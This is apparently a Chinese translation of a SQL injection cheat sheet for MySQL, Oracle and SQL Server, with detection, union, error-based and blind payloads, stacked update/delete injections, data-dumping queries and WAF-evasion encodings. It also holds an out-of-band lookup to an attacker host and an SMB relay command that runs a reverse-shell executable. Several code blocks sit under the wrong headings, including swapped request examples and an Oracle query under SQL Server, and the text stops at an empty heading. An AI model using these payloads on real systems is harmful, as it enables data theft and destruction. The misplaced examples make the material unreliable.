\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/8AUJtfn28VfgBSQKajcgfw)

![](https://mmbiz.qpic.cn/mmbiz_gif/GfOvuXUmaIichKN4fuyBV856xHdsnuRTeChfYItiaiaP6C5QQibXh56dmwWiaMFia2yE01nib45cPuiaib6kMd5OT95aeeA/640?wx_fmt=gif)  

****本文主要用于全面识别，利用和升级各种数据库管理系统中的 SQL 注入漏洞。****

**0x00** **注入检测**
-----------------

**SQL 注入检测**
------------

    可以通过多种方式检测注入。其中最简单的方法是在各种参数后添加`'`或`"`从而得到一个从 Web 服务器返回的数据库报错信息。以下部分描述了在哪里可以找到这些参数以及如何检测这些参数。

###  **参数位置**

浏览下面的标签，查看各种 HTTP 请求中的常见注入点。常见注入点以红色突出显示

 **GET - HTTP Request**   
在常见的 HTTP GET 请求（以及大多数请求类型）中，有一些常见的注入点。例如：网址参数（下面的请求的`id`），Cookie，host 以及任何自定义 headers 信息。然而，HTTP 请求中的任何内容都可能容易受到 SQL 注入的攻击。

```
GET /?id=homePage HTTP/1.1
Host: www.netspi.com
Connection: close
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Server-Name: PROD
Cookie: user=harold;
```

**POST - Form Data**  
 在具有 Content-Type 为 application/x-www-form-urlencoded 的标准 HTTP POST 请求中，注入将类似于 GET 请求中的 URL 参数。它们位于 HTTP 头信息下方，但仍可以用相同的方式进行利用。

```
POST / HTTP/1.1
Host: netspi.com.com
Content-Type: application/json
Content-Length: 56
{
"username":"harold",
"email":"harold@netspi.com"
}
```

**POST - JSON**  
 在具有 Content-Type 为 application/json 的标准 HTTP POST 请求中，注入通常是`JSON{"key":"value"}`对的值。该值也可以是数组或对象。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用`'`，但要确保 JSON 使用双引号，否则可能会破坏请求格式。）

```
POST / HTTP/1.1
Host: netspi.com.com
Content-Type: application/xml
Content-Length: 79
<root>
<username>harold</username>
<email>harold@netspi.com</email>
</root>
```

**POST - XML**  
 在具有 Content-Type 为 application/xml 的标准 HTTP POST 请求中，注入通常在一个内部。虽然符号是不同的，但值可以像所有其他参数一样注入。（提示：尝试使用`'`）

```
SELECT CASE WHEN (\*PARTIAL\_BLIND\_QUERY\*)=1 THEN (SELECT count(\*) FROM all\_users a, all\_users b, all\_users c, all\_users d) ELSE 0 END FROM dual
```

### **检测注入**

通过在应用程序中触发错误和布尔逻辑，可以最轻松地检测易受攻击的参数。提供格式错误的查询将触发错误，并且使用各种布尔逻辑语句发送有效查询将触发来自 Web 服务器的不同响应。

注：True 或 False 语句应通过 HTTP 状态码或 HTML 内容返回不同的响应。如果这些响应与查询的 True/False 性质一致，则表示存在注入。

<table width="677"><thead><tr><th>描述</th><th width="280" align="center">语句</th></tr></thead><tbody><tr><td>逻辑测试</td><td width="55" align="center">page.asp?id=1 or 1=1 -- true&nbsp;<br>page.asp?id=1' or 1=1 -- true<br>page.asp?id=1" or 1=1 -- true<br>page.asp?id=1 and 1=2 -- false</td></tr><tr><td>算术</td><td width="55" align="center">product.asp?id=1/1 -- true<br>product.asp?id=1/0 -- false</td></tr><tr><td>基于盲注：<br>检测盲注可能需要识别或猜测 DBMS，<br>并检查以找到适当的时间函数。</td><td width="55" align="center">下文讲解<br></td></tr><tr><td>基于错误：<br>注意：使用无效语法的逻辑测试和算术<br>也可能会导致错误。</td><td width="55" align="center">下文讲解</td></tr></tbody></table>

**0x01** **DBMS 识别**
--------------------

检测正在使用的数据库管理系统（DBMS）对于进一步利用注入来说至关重要。没有这些知识，就无法确定要查询的表，内置的函数以及要避免的检测。下面查询的成功响应表明正在使用所选的 DBMS.

注意：注释字符 `--` 放置在查询后面，以删除查询后面的任何命令，有助于防止出现错误。

#### **MySQL**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>SLEEP</td><td align="center">page.php?id=1'-SLEEP(1)=0 LIMIT 1 --</td></tr><tr><td>BENCHMARK</td><td align="center">page.php?id=1'-BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds'))=0 LIMIT 1 --</td></tr><tr><td>字符串连接</td><td align="center">page.php?id=''mysql' --</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含 DBMS 名称的详细错误消息。</td><td align="center">page.php?id='</td></tr></tbody></table>

##### **一般提示**

PHP 应用程序通常具有 MySQL 数据库。

##### 将查询转换为注入

既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。`SELECT @@version`将是示例查询。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td align="center">product.php?id=' UNION SELECT @@version --</td></tr><tr><td>联合子查询</td><td align="center">product.php?id=' UNION (SELECT @@version) --</td></tr><tr><td>联合 null&nbsp;<br>注意：如果原始查询返回多个列，<br>则添加 null 以等于列数</td><td align="center">product.php?id=4 UNION SELECT @@version,null --</td></tr><tr><td>堆积式查询<br>注意：堆积式查询并不总是返回结果，<br>因此它们最适合用于更新 / 修改数据的注入。</td><td align="center">product.php?id='; INSERT INTO'docs'('content') VALUES ((SELECT @@version)) --</td></tr></tbody></table>

#### **Oracle**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>字符串连接</td><td align="center">page.jsp?id='||'oracle' --</td></tr><tr><td>默认表</td><td align="center">page.jsp?id='UNION SELECT 1 FROM v$version --</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含 DBMS 名称的详细错误消息。</td><td align="center">page.jsp?id='</td></tr></tbody></table>

##### **一般提示**

根据应用程序提供的错误，如果存在 “ORA-XXXX” 错误，其中每个 X 都是整数，则表示数据库是 Oracle.

JSP 应用程序通常具有 Oracle 数据库。

##### 将查询转换为注入

既然已经确定了诸如点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。`SELECT banner FROM v$version`将是示例查询。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td align="center">product.jsp?id=' UNION SELECT banner FROM v$version --</td></tr><tr><td>联合子查询</td><td align="center">product.jsp?id=' UNION (SELECT banner FROM v$version) --</td></tr><tr><td>联合 null&nbsp;<br>注意: 如果原始查询返回多个列，<br>则添加 null 以等于列数 - 1</td><td align="center">product.jsp?id=' UNION SELECT banner,null FROM v$version --</td></tr></tbody></table>

#### **SQL Server**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>WAITFOR 函数</td><td align="center">page.asp?id=';WAITFOR DELAY'00:00:10'; --</td></tr><tr><td>默认变量</td><td align="center">page.asp?id=sql'; SELECT @@SERVERNAME --</td></tr><tr><td>错误消息<br>注意：通过无效语法触发数据库错误<br>有时会返回包含 DBMS 名称的详细错误消息。</td><td align="center">page.asp?id='</td></tr><tr><td>错误消息<br>注意：如果 id 参数是整数，<br>则 @@ SERVERNAME 变量的字符串值可能导致转换错误。</td><td align="center">page.asp?id=@@SERVERNAME</td></tr><tr><td>错误消息<br>注意：如果 id 参数是整数，<br>则 @@ SERVERNAME 变量的字符串值可能导致转换错误。</td><td align="center">page.asp?id=0/@@SERVERNAME</td></tr></tbody></table>

### **一般提示**

基于 ASP / ASPX 的应用程序一般都是 MSSQL。

### **将查询转换为注入**

既然已经确定了注入点，本指南的其余部分将包含完整的查询。使用以下方法将这些查询插入注入点。`SELECT @@version`将是示例查询。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>联合查询</td><td align="center">product.asp?id=' UNION SELECT @@version --</td></tr><tr><td>联合子查询</td><td align="center">product.asp?id=' UNION (SELECT @@version) --</td></tr><tr><td>联合 null&nbsp;<br>注意：如果原始查询返回多个列，<br>则添加 null 以等于列数</td><td align="center">product.asp?id=' UNION (SELECT @@version,null) --</td></tr><tr><td>堆积式查询<br>注意：堆积式查询并不总是返回结果，<br>因此它们最适合用于更新 / 修改数据的注入。</td><td align="center">product.asp?id='; SELECT @@version --</td></tr></tbody></table>

**0x02** **注入类型** 
------------------

### **1、基于错误**

当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。错误消息可用于返回完整的查询结果，或获取有关如何重构查询以供进一步利用的信息。

#### **MYSQL**

<table width="677"><thead><tr><th width="85">描述</th><th width="450" align="center">语句</th></tr></thead><tbody><tr><td width="57">XML 解析错误</td><td width="450" align="center">SELECT extractvalue(rand(),concat(0x3a,(select version())))</td></tr><tr><td width="57">双查询</td><td width="450" align="center">SELECT 1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(<strong>SELECT username FROM USERS LIMIT 0,1</strong>),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a) &nbsp;<br>递增 limit 0,1 到 limit 1,1 开始循环数据</td></tr><tr><td width="57">获取当前数据库</td><td width="450" align="center">SELECT a()</td></tr></tbody></table>

#### **Oracle**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>无效的 HTTP 请求</td><td align="center">SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual</td></tr><tr><td>CTXSYS.DRITHSX.SN</td><td align="center">SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual</td></tr><tr><td>无效的 XPath</td><td align="center">SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual</td></tr><tr><td>无效的 XML</td><td align="center">SELECT to_char(dbms_xmlgen.getxml('select"'||(select user from sys.dual)||'"FROM sys.dual')) FROM dual</td></tr><tr><td>无效的 XML</td><td align="center">SELECT rtrim(extract(xmlagg(xmlelement("s", username || ',')),'/s').getstringval(),',') FROM all_users</td></tr></tbody></table>

#### **SQL Server**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>显式转换</td><td align="center">SELECT convert(int,(SELECT @@version))&nbsp;<br>SELECT cast((SELECT @@version) as int)</td></tr><tr><td>隐式转换</td><td align="center">SELECT 1/@@version</td></tr></tbody></table>

### **MSSQL CAST 函数示例**

以下任何查询都可以使用该`convert`函数重写或作为隐式转换.

<table width="677"><thead><tr><th width="84">描述</th><th width="451" align="center">语句</th></tr></thead><tbody><tr><td width="0">将 CAST 函数注入当前查询</td><td width="451" align="center">SELECT CAST(@@version as int)</td></tr><tr><td width="0">显示系统用户</td><td width="451" align="center">SELECT CAST(SYSTEM_USER as int);</td></tr><tr><td width="0">用 xml 路径在一行中显示所有数据库</td><td width="451" align="center">SELECT CAST((SELECT name,',' FROM master..sysdatabases FOR XML path('')) as int)&nbsp;<br>SELECT CAST((SELECT name AS "data()" FROM master..sysdatabases FOR xml path('')) AS int);</td></tr><tr><td width="0">显示服务器名称</td><td width="451" align="center">SELECT CAST(@@SERVERNAME as int);</td></tr><tr><td width="0">显示服务名称</td><td width="451" align="center">SELECT CAST(@@SERVICENAME as int);</td></tr><tr><td width="0">显示数据库列表&nbsp;<br>注意：下面的查询必须在一行中执行。</td><td width="451" align="center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM master..sysdatabases;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</code></td></tr><tr><td width="0">显示表列表&nbsp;<br>注意：下面的查询必须在一行中执行</td><td width="451" align="center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX); SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..sysobjects WHERE type = 'U';SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);SELECT CAST(@myoutput as int);</code></td></tr><tr><td width="0">显示列列表&nbsp;<br>注意：下面的查询必须在一行中执行。</td><td width="451" align="center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';SELECT @listStr = @listStr + Name + ',' FROM MYDATABASE..syscolumns WHERE id=object_id('MYTABLE');SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1);select cast(@myoutput as int);</code></td></tr><tr><td width="0">显示列数据<br>注意：下面的查询必须在一行中执行。用<code>*</code>替换<code>MYCOLUMN</code>来选择所有列</td><td width="451" align="center"><code>DECLARE @listStr VARCHAR(MAX);DECLARE @myoutput VARCHAR(MAX);SET @listStr = '';SELECT @listStr = @listStr + MYCOLUMN + ',' FROM MYDATABASE..MYTABLE;SELECT @myoutput = SUBSTRING(@listStr , 1, LEN(@listStr)-1)SELECT CAST(@myoutput as int);</code></td></tr><tr><td width="0">一次显示一个数据库名称<br>注意：递增内部 TOP 值以获取下一条记录</td><td width="451" align="center"><code>SELECT TOP 1 CAST(name as int) FROM sysdatabases WHERE name in (SELECT TOP 2 name FROM sysdatabases ORDER BY name ASC) ORDER BY name DESC&nbsp;</code></td></tr></tbody></table>

### **2、联合查询注入**

基于联合的 SQL 注入允许攻击者通过扩展原始查询返回的结果来从数据库中提取信息。仅当原始 / 新查询具有相同结构（列的数量和数据类型）时，才能使用联合运算符。

#### **MySQL**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>联合</td><td align="center">SELECT "mysql" UNION SELECT @@version</td></tr><tr><td>联合子查询</td><td align="center">SELECT "mysql" UNION (select @@version)</td></tr><tr><td>联合 null&nbsp;<br>注意：如果原始查询返回多个列，则添加 null 以等于列数</td><td align="center">SELECT "mysql","test" UNION SELECT @@version,null</td></tr><tr><td>堆叠查询&nbsp;<br>注意：堆叠查询并不总是返回结果，因此它们最适合用于更新 / 修改数据的注入。</td><td align="center">SELECT "mysql"; INSERT INTO 'docs' ('content') VALUES ((SELECT @@version))</td></tr></tbody></table>

#### **Oracle**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>联合</td><td align="center">SELECT user FROM dual UNION SELECT * FROM v$version</td></tr><tr><td>联合子查询</td><td align="center">SELECT user FROM dual UNION (SELECT * FROM v$version)</td></tr><tr><td>联合 null&nbsp;<br>注意：如果原始查询返回多个列，则添加 null 以等于列数</td><td align="center">SELECT user,dummy FROM dual UNION (SELECT banner,null FROM v$version)</td></tr></tbody></table>

#### **SQL Server**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>联合</td><td align="center">SELECT user UNION SELECT @@version</td></tr><tr><td>联合子查询</td><td align="center">SELECT user UNION (SELECT @@version)</td></tr><tr><td>联合 null<br>注意：如果原始查询返回多个列，则添加 null 以等于列数</td><td align="center">SELECT user,system_user UNION (SELECT @@version,null)</td></tr><tr><td>联合 null 二进制减半&nbsp;<br>注意：此查询用于检测列数。[numberOfColumns] 大于列数则返回错误，从而找到表中列的数目。</td><td align="center">SELECT * FROM yourtable ORDER BY [numberOfColumns]</td></tr><tr><td>堆积式查询&nbsp;<br>注意：堆积式查询并不总是返回结果，因此它们最适合用于更新 / 修改数据的注入。</td><td align="center">SELECT @@version; SELECT @@version --</td></tr></tbody></table>

### **3、盲注**

盲注是更高级的注入方法之一。部分盲和全盲方法详述如下。执行这些查询时要小心，因为如果通过大量自动化执行，它们可能会使服务器过载。

#### **MySQL**

##### **部分盲**

部分盲注是指返回 HTTP 状态代码或 HTML 响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回 1（真）或 0（假）行来识别。一个错误也可以用来标识 0（False）。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>版本是 5.xx</td><td align="center">SELECT substring(version(),1,1)=5</td></tr><tr><td>子选择启用</td><td align="center">SELECT 1 AND (select 1)=1</td></tr><tr><td>表 log_table 存在</td><td align="center">SELECT 1 AND (select 1 from log_table limit 0,1)=1</td></tr><tr><td>列 message 存在于表 log_table 中&nbsp;<br>注意：如果列不存在，则查询应该出错</td><td align="center">SELECT message FROM log_table LIMIT 0,1</td></tr><tr><td>第一条 message 的第一个字母是 t</td><td align="center">SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114</td></tr></tbody></table>

##### 将部分盲查询转换为全盲查询

```
IF exists(\*PARTIAL\_BLIND\_QUERY\*) WAITFOR DELAY '00:00:02'
```

##### **全盲**

部分盲注可以通过 HTTP 响应中的不同 HTTP 状态代码，响应时间，内容长度和 HTML 内容来确定。这些标记可以指示真或假的陈述。下面的查询将试图通过在猜测的信息上声明真或假的响应来利用注入。真或假查询也可以通过返回 1（真）或 0（假）行来识别。一个错误也可以用来标识 0（False）。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>用户是 root</td><td align="center">SELECT IF(user() LIKE 'root@%', SLEEP(5), null)</td></tr><tr><td>用户是 root（Benchmark 方法）</td><td align="center">SELECT IF(user() LIKE 'root@%', BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds')), null)</td></tr><tr><td>版本是 5.xx</td><td align="center">SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)</td></tr></tbody></table>

#### **Oracle**

##### **部分盲**

部分盲注是指返回 HTTP 状态代码或 HTML 响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回 1（真）或 0（假）行来识别。一个错误也可以用来标识 0（False）。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>版本是 12.2</td><td align="center">SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';</td></tr><tr><td>子选择启用</td><td align="center">SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)</td></tr><tr><td>表 log_table 存在</td><td align="center">SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);</td></tr><tr><td>列 message 存在于表 log_table 中</td><td align="center">Select COUNT(*) from user_tab_cols where column_name = 'MESSAGE' and table_name = 'LOG_TABLE';</td></tr><tr><td>第一条 message 的第一个字母是 t</td><td align="center">Select message from log_table where rownum=1 and message LIKE 't%';</td></tr></tbody></table>

##### **将部分盲查询转换为全盲查询**

通过使用以下转换，可以在全盲方案中使用上述任何查询：

```
smbrelayx.py -h VICTIM.IP.GOES.HERE -e ./reverse\_shell.exe
```

##### 全盲

全盲查询不会在 HTTP / HTML 响应中指示任何查询结果。这使他们依赖于定时功能和其他 out-of-band 攻击方法。一个真的 SQL 语句需要 X 秒的回应，一个假的 SQL 语句应该立即返回。

<table width="677"><thead><tr><th width="66">描述</th><th width="469" align="center">语句</th></tr></thead><tbody><tr><td width="51">版本是 12.2</td><td width="469" align="center">SELECT CASE WHEN (SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%11.2%')=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual</td></tr></tbody></table>

#### **SQL Server**

##### **部分盲**

部分盲注是指返回 HTTP 状态代码或 HTML 响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回 1（真）或 0（假）行来识别。一个错误也可以用来标识 0（False）。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>版本是 12.0.2000.8</td><td align="center">SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'</td></tr><tr><td>子选择启用</td><td align="center">SELECT (SELECT @@version)</td></tr><tr><td>表 log_table 存在</td><td align="center">SELECT * FROM log_table</td></tr><tr><td>列 message 存在于表 log_table 中</td><td align="center">SELECT message from log_table</td></tr><tr><td>第一条 message 的第一个字母是 t</td><td align="center">WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like 't%'</td></tr></tbody></table>

##### **将部分盲查询转换为全盲查询**

通过使用以下转换，可以在全盲方案中使用上述任何查询：

```
SELECT value FROM v$parameter2 WHERE name = 'utl\_file\_dir';
```

##### **全盲**

全盲查询不会在 HTTP / HTML 响应中指示任何查询结果。这使他们依赖于定时功能和其他 out-of-band 攻击方法。一个真的 SQL 语句需要 X 秒的回应，一个假的 SQL 语句应该立即返回。

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>Version is 12.0.2000.8</td><td align="center">IF exists(SELECT @@version where @@version like '%12.0.2000.8%') WAITFOR DELAY '00:00:02'</td></tr></tbody></table>

**0x03** **注入技术**
-----------------

以下是一些技巧，可以帮助您利用各种 SQL 注入。

### **1、条件语句**

条件语句有助于创建复杂的查询并帮助盲注入。

#### **MySQL**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>If/Else</td><td align="center">SELECT IF(1=2,'true','false')</td></tr><tr><td>逻辑 OR</td><td align="center">SELECT 1 || 0<br>看到这个运算符的细微差别去这里</td></tr></tbody></table>

#### **Oracle**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>Case</td><td align="center">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual</td></tr></tbody></table>

#### **SQL Server**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>Case</td><td align="center">SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END</td></tr><tr><td>If/Else</td><td align="center">IF 1=2 SELECT 'true' ELSE SELECT 'false';</td></tr></tbody></table>

### **2、注入定位**

当注入发生的地方并不明显时，SQL 注入总是很麻烦。有一些方法可以在查询的各个部分利用注入是有帮助的。

`$injection`确定注入点。修改数据的注入尝试始终使用连接，并允许查询的其余部分有效。通过这个文章可以了解更多信息。

#### **MySQL**

<table width="677"><thead><tr><th>注入位置</th><th align="center">语句</th><th align="center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td align="center">SELECT * FROM USERS WHERE USER='$injection';</td><td align="center">' or 1=1 --</td></tr><tr><td>UPDATE -&gt; SET</td><td align="center">UPDATE USERS SET email='$injection' WHERE user='NetSPI';</td><td align="center">''harold@netspi.com' '</td></tr><tr><td>UPDATE -&gt; WHERE&nbsp;<br>注意：尝试将注入字符串设置为有效的 WHERE 值。如果对象已更新，则注入成功。</td><td align="center">UPDATE USERS SET email='harold@netspi.com' WHERE user='$injection';</td><td align="center">''netspi' '</td></tr><tr><td>DELETE -&gt; WHERE&nbsp;<br>注意：运行删除语句时要非常小心，因为整个表都会被删除。</td><td align="center">DELETE FROM USERS WHERE USERS='$injection';</td><td align="center">''harold@netspi.com' '</td></tr></tbody></table>

#### **Oracle**

<table width="677"><thead><tr><th>注入位置</th><th align="center">语句</th><th align="center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td align="center">SELECT user FROM dual WHERE user LIKE '$injection';</td><td align="center">'||'USER%'||'</td></tr><tr><td>INSERT -&gt; VALUES</td><td align="center">INSERT INTO log_table (message) VALUES ('$injection');</td><td align="center">'||(select user from dual)||'</td></tr><tr><td>UPDATE -&gt; SET</td><td align="center">UPDATE log_table SET message = '$injection' WHERE message = 'test';</td><td align="center">'||(select user from dual)||</td></tr><tr><td>UPDATE -&gt; WHERE&nbsp;<br>注意：尝试将注入字符串设置为有效的 WHERE 值。如果对象已更新，则注入成功。</td><td align="center">UPDATE log_table SET message = 'test' WHERE message = '$injection';</td><td align="center">'||'Injected'||'</td></tr></tbody></table>

#### **SQL Server**

<table width="677"><thead><tr><th>注入位置</th><th align="center">语句</th><th align="center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td align="center">SELECT * FROM USERS WHERE "USER"='$injection';</td><td align="center">' or 1=1 --</td></tr><tr><td>UPDATE -&gt; SET</td><td align="center">UPDATE USERS SET "email"='$injection' WHERE "USER"='NetSPI';</td><td align="center">'+'harold@netspi.com'+'</td></tr><tr><td>UPDATE -&gt; WHERE&nbsp;<br>注意：尝试将注入字符串设置为有效的 WHERE 值。如果对象已更新，则注入成功。</td><td align="center">UPDATE USERS SET "email"='harold@netspi.com' WHERE "USER"='$injection';</td><td align="center">'+'NetSPI'+'</td></tr><tr><td>DELETE -&gt; WHERE</td><td align="center">DELETE USERS WHERE "User"='$injection';</td><td align="center">'+'NetSPI'+'</td></tr><tr><td>INSERT -&gt; VALUES</td><td align="center">INSERT INTO USERS ([User], [Password]) VALUES ('$injection', 'password');</td><td align="center">'+(select @@version)+'</td></tr></tbody></table>

### **3、混淆查询**

混淆查询帮助绕过 Web 应用程序防火墙（WAF）和入侵检测 / 预防系统（IDS / IPS）。以下是基本查询混淆的示例，它们在应用于某些注入之前可能需要进行修改。

#### **MySQL**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>ASCII &gt; 字符</td><td align="center">SELECT char（65）</td></tr><tr><td>字符 &gt; ASCII</td><td align="center">SELECT ascii（'A'）</td></tr><tr><td>十六进制</td><td align="center">SELECT 0x4A414B45</td></tr><tr><td>Hex&gt; Int</td><td align="center">SELECT 0x20 + 0x40</td></tr><tr><td>按位与</td><td align="center">SELECT 6 &amp; 2</td></tr><tr><td>按位或</td><td align="center">SELECT 6</td></tr><tr><td>按位否定</td><td align="center">SELECT ~6</td></tr><tr><td>按位 XOR</td><td align="center">SELECT 6 ^ 2</td></tr><tr><td>右移</td><td align="center">SELECT 6&gt;&gt;2</td></tr><tr><td>左移</td><td align="center">SELECT 6&lt;&lt;2</td></tr><tr><td>字符串截取</td><td align="center">SELECT substr('abcd', 3, 2) &nbsp;<br>substr(string, index, length)</td></tr><tr><td>Casting</td><td align="center">SELECT cast('1' AS unsigned integer) &nbsp;<br>SELECT cast('123' AS char)</td></tr><tr><td>字符串连接</td><td align="center">SELECT concat('net','spi')&nbsp;<br>SELECT 'n' 'et' 'spi'</td></tr><tr><td>无引号</td><td align="center">SELECT CONCAT(CHAR(74),CHAR(65),CHAR(75),CHAR(69))</td></tr><tr><td>块注释</td><td align="center">SELECT/*block &nbsp;<br>&nbsp;comment*/"test"</td></tr><tr><td>单行注释</td><td align="center">SELECT 1 -- comments out rest of line &nbsp;<br>SELECT 1 # comments out rest of line</td></tr><tr><td>无空格</td><td align="center">SELECT(username)FROM(USERS)WHERE(username='netspi')</td></tr><tr><td>允许空白</td><td align="center">09, 0A, 0B, 0C, 0D, A0, 20</td></tr><tr><td>URL 编码</td><td align="center">SELECT%20%2A%20FROM%20USERS</td></tr><tr><td>双 URL 编码</td><td align="center">SELECT%2520%2A%2520FROM%2520USERS</td></tr><tr><td>无效百分号编码</td><td align="center">%SEL%ECT * F%R%OM U%S%ERS</td></tr></tbody></table>

**Oracle**

<table width="677"><thead><tr><th>描述</th><th align="center">语句</th></tr></thead><tbody><tr><td>ASCII &gt; 字符</td><td align="center">SELECT char(65) from dual</td></tr><tr><td>字符 &gt; ASCII</td><td align="center">SELECT ascii('A') from dual</td></tr><tr><td>按位 AND</td><td align="center">SELECT 6 &amp; 2 from dual</td></tr><tr><td>按位或</td><td align="center">SELECT 6 from dual</td></tr><tr><td>按位否定</td><td align="center">SELECT ~6 from dual</td></tr><tr><td>按位 XOR</td><td align="center">SELECT 6 ^ 2 from dual</td></tr><tr><td>选择第 N 个字符</td><td align="center">SELECT substr('abcd', 3, 1) FROM dual; -- Returns 3rd charcter, 'c'</td></tr><tr><td>字符串截取</td><td align="center">SELECT substr('abcd', 3, 2) from dual&nbsp;<br>substr(string, index, length)</td></tr><tr><td>Cast</td><td align="center">select CAST(12 AS CHAR(32)) from dual</td></tr><tr><td>字符串连接</td><td align="center">SELECT concat('net','spi') from dual</td></tr><tr><td>注释</td><td align="center">SELECT 1 FROM dual -- comment</td></tr><tr><td>If 语句</td><td align="center">BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF;</td></tr><tr><td>Case 语句</td><td align="center">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; -- Returns 1&nbsp;<br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; -- Returns 2</td></tr><tr><td>时间延迟</td><td align="center">BEGIN DBMS_LOCK.SLEEP(5); END; (Requires Privileges)&nbsp;<br>SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;&nbsp;<br>SELECT UTL_INADDR.get_host_address('blah.attacker.com') FROM dual; &nbsp;<br>SELECT UTL_HTTP.REQUEST('http://google.com') FROM dual;</td></tr><tr><td>选择第 n 行</td><td align="center">SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; -- Returns 9th row</td></tr><tr><td>按位与</td><td align="center">SELECT bitand(6,2) FROM dual; -- Returns 2&nbsp;<br>SELECT bitand(6,1) FROM dual; -- Returns 0</td></tr><tr><td>字符串连接</td><td align="center">SELECT 'A' || 'B' FROM dual; -- Returns AB</td></tr><tr><td>避免引号</td><td align="center">SELECT chr(65) || chr(66) FROM dual; -- Returns AB</td></tr><tr><td>16 进制编码</td><td align="center">SELECT 0x75736572 FROM dual;</td></tr></tbody></table>

#### **SQL Server**

